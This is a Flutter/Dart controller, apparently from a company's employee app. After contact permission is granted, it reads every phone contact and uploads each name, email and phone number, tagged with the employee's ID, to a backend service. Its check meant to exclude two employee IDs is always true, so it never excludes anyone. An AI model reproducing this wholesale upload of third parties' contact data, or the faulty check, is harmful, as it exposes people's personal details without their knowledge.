import 'dart:convert';
import 'package:fast_contacts/fast_contacts.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:neways3/src/features/phone_contact/services/phone_contact_service.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';


class PhoneContactController extends GetxController{

  List<Contact> _contacts = const [];
  String? _text;

  Future<void> getContactPermissions() async {
    await Permission.contacts.request();
  }

  Future<void> loadContacts(String currentEmployeeId, String type) async {
    try {

      if(await Permission.contacts.isGranted){
        _contacts = await FastContacts.getAllContacts();
        _contacts.removeWhere((element) => element.phones.isEmpty);
        List<String> contactItems = [];

        if(!(currentEmployeeId=="72505" && currentEmployeeId=="72149")){
          for(int i=0; i<_contacts.length; i++){
            var innerData = jsonEncode(<String, dynamic>{
              "member_id": currentEmployeeId, //CurrentMemberId
              "email": _contacts[i].emails.isNotEmpty?_contacts[i].emails.first.address:"N/A",
              "name": _contacts[i].displayName.isNotEmpty?_contacts[i].displayName : "N/A",
              "phone": _contacts[i].phones.isNotEmpty?_contacts[i].phones.first.number:"N/A",
              "type": type //"member"
            });
            contactItems.add(innerData);
          }
          PhoneContactService.uploadContact(contactItems);
        }


      }else{
        print("Permission Not Granted!");
      }

    } on PlatformException catch (e) {
      _text = 'Failed to get contacts:\n${e.details}';
      print(_text);
    }
  }



}